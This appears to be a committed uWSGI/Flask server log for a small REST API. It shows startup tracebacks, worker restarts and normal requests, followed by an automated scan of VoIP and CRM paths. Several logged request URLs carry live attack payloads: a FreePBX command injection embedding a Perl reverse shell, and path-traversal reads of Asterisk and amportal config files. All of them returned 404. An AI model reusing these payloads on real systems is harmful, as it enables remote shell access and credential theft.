+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 8/12] 68.65.67.34 () {44 vars in 622 bytes} [Thu Jun  7 03:14:22 2018] POST /user/register/ => generated 291 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 84 bytes (2 switches on core 5)
+Creating tables
+[2018-06-07 03:15:12,040] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE')
+NameError: name 'db' is not defined
+[pid: 1602|app: 0|req: 3/13] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:15:12 2018] GET /users => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 3)
+Thu Jun  7 03:16:39 2018 - received message 0 from emperor
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 2 seconds
+worker 2 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
+worker 5 buried after 2 seconds
+worker 6 buried after 2 seconds
+worker 7 buried after 2 seconds
+worker 8 buried after 2 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 03:16:44 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x165df20
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x165df20 pid: 1949 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1949)
+spawned uWSGI worker 1 (pid: 1953, cores: 8)
+spawned uWSGI worker 2 (pid: 1954, cores: 8)
+spawned uWSGI worker 3 (pid: 1955, cores: 8)
+spawned uWSGI worker 4 (pid: 1956, cores: 8)
+spawned uWSGI worker 5 (pid: 1957, cores: 8)
+spawned uWSGI worker 6 (pid: 1958, cores: 8)
+spawned uWSGI worker 7 (pid: 1959, cores: 8)
+spawned uWSGI worker 8 (pid: 1960, cores: 8)
+Thu Jun  7 03:18:09 2018 - uWSGI worker 7 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 03:20:46 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x8d2f20
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x8d2f20 pid: 1567 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1567)
+spawned uWSGI worker 1 (pid: 1571, cores: 8)
+spawned uWSGI worker 2 (pid: 1572, cores: 8)
+spawned uWSGI worker 3 (pid: 1573, cores: 8)
+spawned uWSGI worker 4 (pid: 1574, cores: 8)
+spawned uWSGI worker 5 (pid: 1575, cores: 8)
+spawned uWSGI worker 6 (pid: 1576, cores: 8)
+spawned uWSGI worker 7 (pid: 1577, cores: 8)
+spawned uWSGI worker 8 (pid: 1578, cores: 8)
+Creating tables
+[pid: 1572|app: 0|req: 1/1] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:20:53 2018] GET /users => generated 573 bytes in 32 msecs (HTTP/1.1 200) 5 headers in 188 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+Creating tables
+[pid: 1571|app: 0|req: 1/2] 68.65.67.34 () {44 vars in 622 bytes} [Thu Jun  7 03:21:19 2018] POST /user/register/ => generated 233 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+announcing my loyalty to the Emperor...
+[pid: 1571|app: 0|req: 2/3] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:21:27 2018] GET /users => generated 573 bytes in 9 msecs (HTTP/1.1 200) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1571|app: 0|req: 3/4] 68.65.67.34 () {44 vars in 620 bytes} [Thu Jun  7 03:22:09 2018] POST /user/register => generated 79 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 187 bytes (1 switches on core 3)
+[pid: 1571|app: 0|req: 4/5] 68.65.67.34 () {44 vars in 620 bytes} [Thu Jun  7 03:22:39 2018] POST /user/register => generated 58 bytes in 55 msecs (HTTP/1.1 201) 5 headers in 192 bytes (1 switches on core 2)
+[pid: 1571|app: 0|req: 5/6] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:22:43 2018] GET /users => generated 747 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1571|app: 0|req: 6/7] 68.65.67.34 () {40 vars in 533 bytes} [Thu Jun  7 03:25:24 2018] GET /categories => generated 109 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1571|app: 0|req: 7/8] 182.48.105.210 () {40 vars in 564 bytes} [Thu Jun  7 03:57:56 2018] GET /l.php => generated 233 bytes in 0 msecs (HTTP/1.0 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1571|app: 0|req: 8/9] 189.163.249.185 () {32 vars in 469 bytes} [Thu Jun  7 04:52:54 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1571|app: 0|req: 9/10] 201.94.252.215 () {32 vars in 461 bytes} [Thu Jun  7 05:02:03 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1571|app: 0|req: 10/11] 77.245.162.35 () {32 vars in 461 bytes} [Thu Jun  7 05:09:37 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1571|app: 0|req: 11/12] 49.156.149.114 () {32 vars in 462 bytes} [Thu Jun  7 06:36:43 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1571|app: 0|req: 12/13] 43.229.73.174 () {32 vars in 461 bytes} [Thu Jun  7 06:40:55 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1571|app: 0|req: 13/14] 142.0.43.230 () {32 vars in 452 bytes} [Thu Jun  7 07:17:38 2018] GET /FS/BOARD.ini => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+Creating tables
+[pid: 1576|app: 0|req: 1/15] 142.0.43.230 () {30 vars in 439 bytes} [Thu Jun  7 07:17:38 2018] GET /cgi-bin/download_cfg => generated 233 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 1571|app: 0|req: 14/16] 142.0.43.230 () {30 vars in 413 bytes} [Thu Jun  7 07:17:38 2018] GET /all.prm => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1576|app: 0|req: 2/17] 142.0.43.230 () {30 vars in 421 bytes} [Thu Jun  7 07:17:38 2018] GET /startup.cfg => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1576|app: 0|req: 3/18] 142.0.43.230 () {30 vars in 441 bytes} [Thu Jun  7 07:17:38 2018] GET /backuprestoreconf.cgi => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1576|app: 0|req: 4/19] 142.0.43.230 () {30 vars in 421 bytes} [Thu Jun  7 07:17:38 2018] GET /rg_conf.cgi => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1576|app: 0|req: 5/20] 142.0.43.230 () {30 vars in 427 bytes} [Thu Jun  7 07:17:38 2018] GET /cgi-bin/config => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1576|app: 0|req: 6/21] 142.0.43.230 () {30 vars in 491 bytes} [Thu Jun  7 07:17:38 2018] GET /modules/extensions_batch/libs/download_csv.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1576|app: 0|req: 7/22] 142.0.43.230 () {30 vars in 464 bytes} [Thu Jun  7 07:17:38 2018] GET /DB_SIPSTA600.str?DBNAME=DB_SIPSTA => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1576|app: 0|req: 8/23] 142.0.43.230 () {30 vars in 431 bytes} [Thu Jun  7 07:17:39 2018] GET /admin/spacfg.xml => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1572|app: 0|req: 2/24] 142.0.43.230 () {30 vars in 473 bytes} [Thu Jun  7 07:17:39 2018] GET /a2billing/customer/iridium_threed.php => generated 233 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1572|app: 0|req: 3/25] 142.0.43.230 () {30 vars in 506 bytes} [Thu Jun  7 07:17:39 2018] GET /a2billing/customer/iridium_threed.php?transactionID=-1 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1572|app: 0|req: 4/26] 142.0.43.230 () {30 vars in 487 bytes} [Thu Jun  7 07:17:39 2018] GET /admin/modules/framework/bin/gen_amp_conf.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1572|app: 0|req: 5/27] 142.0.43.230 () {30 vars in 461 bytes} [Thu Jun  7 07:17:39 2018] GET /recordings/misc/callme_page.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1572|app: 0|req: 6/28] 142.0.43.230 () {30 vars in 1104 bytes} [Thu Jun  7 07:17:39 2018] GET /recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20'%24p%3dfork%3bexit%2cif(%24p)%3b%24c%3dnew%20IO::Socket::INET(PeerAddr%2c%22'+str(lhost)+':'+str(lport)+'%22)%3bSTDIN-%3Efdopen(%24c%2cr)%3b%24~-%3Efdopen(%24c%2cw)%3bsystem%24_%20while%3C%3E%3b'%0D%0A%0D%0A => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1572|app: 0|req: 7/29] 142.0.43.230 () {30 vars in 467 bytes} [Thu Jun  7 07:17:39 2018] GET /admin/modules/fra...n_amp_conf.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1572|app: 0|req: 8/30] 142.0.43.230 () {30 vars in 491 bytes} [Thu Jun  7 07:17:39 2018] GET /admin/modules/framework/bin/generate_hints.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1572|app: 0|req: 9/31] 142.0.43.230 () {30 vars in 487 bytes} [Thu Jun  7 07:17:39 2018] GET /admin/modules/framework/bin/gen_amp_conf.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+Creating tables
+[pid: 1573|app: 0|req: 1/32] 142.0.43.230 () {30 vars in 674 bytes} [Thu Jun  7 07:17:39 2018] GET /recordings/misc/callme_page.php?action=c&callmenum=[PHONENUMBER]@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20[CMD]%0D%0A%0D%0A => generated 233 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 1571|app: 0|req: 15/33] 142.0.43.230 () {30 vars in 467 bytes} [Thu Jun  7 07:17:39 2018] GET /recordings/modules/callme_page.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+Creating tables
+[pid: 1574|app: 0|req: 1/34] 142.0.43.230 () {30 vars in 469 bytes} [Thu Jun  7 07:17:39 2018] GET /recordings/modules/voicemail.module => generated 233 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 1571|app: 0|req: 16/35] 142.0.43.230 () {30 vars in 421 bytes} [Thu Jun  7 07:17:39 2018] GET /recordings/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1574|app: 0|req: 2/36] 142.0.43.230 () {30 vars in 453 bytes} [Thu Jun  7 07:17:39 2018] GET /vtigercrm/modules/freefpbf/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+Creating tables
+[pid: 1578|app: 0|req: 1/37] 142.0.43.230 () {30 vars in 417 bytes} [Thu Jun  7 07:17:39 2018] GET /freefpbf/ => generated 233 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 1571|app: 0|req: 17/38] 142.0.43.230 () {30 vars in 469 bytes} [Thu Jun  7 07:17:39 2018] GET /Utilities/configuration/phoneBackup => generated 233 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1574|app: 0|req: 3/39] 142.0.43.230 () {30 vars in 484 bytes} [Thu Jun  7 07:17:39 2018] GET /Utilities/configuration/exportFile?source=7 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1574|app: 0|req: 4/40] 142.0.43.230 () {30 vars in 423 bytes} [Thu Jun  7 07:17:40 2018] GET /admin/voice/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1574|app: 0|req: 5/41] 142.0.43.230 () {30 vars in 411 bytes} [Thu Jun  7 07:17:40 2018] GET /admin/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1574|app: 0|req: 6/42] 142.0.43.230 () {30 vars in 445 bytes} [Thu Jun  7 07:17:40 2018] GET /tftpboot/SIPDefault.cnf => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1574|app: 0|req: 7/43] 142.0.43.230 () {30 vars in 429 bytes} [Thu Jun  7 07:17:40 2018] GET /tftpboot/SIP.cn => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1574|app: 0|req: 8/44] 142.0.43.230 () {30 vars in 475 bytes} [Thu Jun  7 07:17:40 2018] GET /tftpboot/cisco_util/XMLDefault.cnf.xml => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1574|app: 0|req: 9/45] 142.0.43.230 () {30 vars in 449 bytes} [Thu Jun  7 07:17:40 2018] GET /admin/Voice_adminPage.stm => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1574|app: 0|req: 10/46] 142.0.43.230 () {30 vars in 437 bytes} [Thu Jun  7 07:17:40 2018] GET /Voice_adminPage.stm => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1573|app: 0|req: 2/47] 142.0.43.230 () {30 vars in 419 bytes} [Thu Jun  7 07:17:40 2018] GET /raspberry/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1573|app: 0|req: 3/48] 142.0.43.230 () {30 vars in 429 bytes} [Thu Jun  7 07:17:40 2018] GET /root/raspberry/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1573|app: 0|req: 4/49] 142.0.43.230 () {30 vars in 417 bytes} [Thu Jun  7 07:17:40 2018] GET /config.db => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1573|app: 0|req: 5/50] 142.0.43.230 () {30 vars in 419 bytes} [Thu Jun  7 07:17:40 2018] GET /sipset.htm => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1573|app: 0|req: 6/51] 142.0.43.230 () {30 vars in 437 bytes} [Thu Jun  7 07:17:40 2018] GET /Voice_adminPage.htm => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1573|app: 0|req: 7/52] 142.0.43.230 () {30 vars in 425 bytes} [Thu Jun  7 07:17:40 2018] GET /phonecfg.cfg/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1573|app: 0|req: 8/53] 142.0.43.230 () {30 vars in 431 bytes} [Thu Jun  7 07:17:40 2018] GET /page_profile.htm => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1573|app: 0|req: 9/54] 142.0.43.230 () {30 vars in 417 bytes} [Thu Jun  7 07:17:40 2018] GET /user.asp/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+Creating tables
+[pid: 1577|app: 0|req: 1/55] 142.0.43.230 () {30 vars in 415 bytes} [Thu Jun  7 07:17:40 2018] GET /cfgB.cg/ => generated 233 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 1571|app: 0|req: 18/56] 142.0.43.230 () {30 vars in 417 bytes} [Thu Jun  7 07:17:40 2018] GET /basic.txt => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1574|app: 0|req: 11/57] 142.0.43.230 () {30 vars in 415 bytes} [Thu Jun  7 07:17:40 2018] GET /pbxnsip/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1574|app: 0|req: 12/58] 142.0.43.230 () {30 vars in 451 bytes} [Thu Jun  7 07:17:40 2018] GET /admin/common/graph_pie.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1574|app: 0|req: 13/59] 142.0.43.230 () {30 vars in 462 bytes} [Thu Jun  7 07:17:40 2018] GET /web-meetme/conf_cdr.php?bookId=1 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1574|app: 0|req: 14/60] 142.0.43.230 () {30 vars in 445 bytes} [Thu Jun  7 07:17:40 2018] GET /asterisk/voicemail.conf => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1574|app: 0|req: 15/61] 142.0.43.230 () {30 vars in 427 bytes} [Thu Jun  7 07:17:40 2018] GET /voicemail.conf => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1574|app: 0|req: 16/62] 142.0.43.230 () {30 vars in 433 bytes} [Thu Jun  7 07:17:40 2018] GET /asterisk/sip.conf => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1574|app: 0|req: 17/63] 142.0.43.230 () {30 vars in 415 bytes} [Thu Jun  7 07:17:40 2018] GET /sip.conf => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1574|app: 0|req: 18/64] 142.0.43.230 () {30 vars in 421 bytes} [Thu Jun  7 07:17:41 2018] GET /extensions/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1576|app: 0|req: 9/65] 142.0.43.230 () {30 vars in 480 bytes} [Thu Jun  7 07:17:41 2018] GET /admin.html?active_page_str=page_dump_conf => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1576|app: 0|req: 10/66] 142.0.43.230 () {30 vars in 421 bytes} [Thu Jun  7 07:17:41 2018] GET /rg_conf.cgi => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1576|app: 0|req: 11/67] 142.0.43.230 () {30 vars in 578 bytes} [Thu Jun  7 07:17:41 2018] GET /vtigercrm/phprint.php?action=fa&module=ff&lang_crm=../../modules/Import/ImportStep2.php%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1576|app: 0|req: 12/68] 142.0.43.230 () {30 vars in 594 bytes} [Thu Jun  7 07:17:41 2018] GET /vtigercrm/upgrade/upgrade.php?action=uplaod&lang=../../../modules/Settings/savewordtemplate.php%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1576|app: 0|req: 13/69] 142.0.43.230 () {30 vars in 470 bytes} [Thu Jun  7 07:17:41 2018] GET /vtigercrm/vtigercron.php?sess=system => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1576|app: 0|req: 14/70] 142.0.43.230 () {30 vars in 548 bytes} [Thu Jun  7 07:17:41 2018] GET /vtigercrm/upgrade/upgrade.php?action=uplaod&lang=../../upload/text/f.txt%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1576|app: 0|req: 15/71] 142.0.43.230 () {30 vars in 558 bytes} [Thu Jun  7 07:17:41 2018] GET /vtigercrm/phprint.php?action=fa&module=ff&lang_crm=../../cache/import/IMPORT_%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1576|app: 0|req: 16/72] 142.0.43.230 () {30 vars in 417 bytes} [Thu Jun  7 07:17:41 2018] GET /graph.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1572|app: 0|req: 10/73] 142.0.43.230 () {30 vars in 421 bytes} [Thu Jun  7 07:17:42 2018] GET /upgrade.php => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1572|app: 0|req: 11/74] 142.0.43.230 () {30 vars in 626 bytes} [Thu Jun  7 07:17:42 2018] GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../..//etc/amportal.conf%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1572|app: 0|req: 12/75] 142.0.43.230 () {30 vars in 656 bytes} [Thu Jun  7 07:17:42 2018] GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../..//etc/asterisk/sip_additional.conf%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1572|app: 0|req: 13/76] 142.0.43.230 () {30 vars in 632 bytes} [Thu Jun  7 07:17:42 2018] GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/sip.conf%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1572|app: 0|req: 14/77] 142.0.43.230 () {30 vars in 650 bytes} [Thu Jun  7 07:17:42 2018] GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/sip-vicidial.conf%00 => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1572|app: 0|req: 15/78] 142.0.43.230 () {30 vars in 465 bytes} [Thu Jun  7 07:17:42 2018] GET /vicidial/project_auth_entries.txt => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1572|app: 0|req: 16/79] 142.0.43.230 () {30 vars in 435 bytes} [Thu Jun  7 07:17:42 2018] GET /MNU_menu_admin.htm => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1572|app: 0|req: 17/80] 142.0.43.230 () {30 vars in 425 bytes} [Thu Jun  7 07:17:42 2018] GET /provisioning/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+Creating tables
+[pid: 1575|app: 0|req: 1/81] 142.0.43.230 () {30 vars in 419 bytes} [Thu Jun  7 07:17:42 2018] GET /provision/ => generated 233 bytes in 16 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 1571|app: 0|req: 19/82] 142.0.43.230 () {30 vars in 417 bytes} [Thu Jun  7 07:17:42 2018] GET /tftpboot/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1575|app: 0|req: 2/83] 142.0.43.230 () {30 vars in 407 bytes} [Thu Jun  7 07:17:42 2018] GET /SIP/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1575|app: 0|req: 3/84] 142.0.43.230 () {30 vars in 413 bytes} [Thu Jun  7 07:17:42 2018] GET /config/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1575|app: 0|req: 4/85] 142.0.43.230 () {30 vars in 423 bytes} [Thu Jun  7 07:17:42 2018] GET /xmlservices/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1575|app: 0|req: 5/86] 142.0.43.230 () {30 vars in 407 bytes} [Thu Jun  7 07:17:42 2018] GET /xml/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1575|app: 0|req: 6/87] 142.0.43.230 () {30 vars in 407 bytes} [Thu Jun  7 07:17:42 2018] GET /cfg/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1575|app: 0|req: 7/88] 142.0.43.230 () {30 vars in 409 bytes} [Thu Jun  7 07:17:42 2018] GET /tftp/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1575|app: 0|req: 8/89] 142.0.43.230 () {30 vars in 413 bytes} [Thu Jun  7 07:17:42 2018] GET /phprov/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1572|app: 0|req: 18/90] 142.0.43.230 () {30 vars in 419 bytes} [Thu Jun  7 07:17:42 2018] GET /tftpphone/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
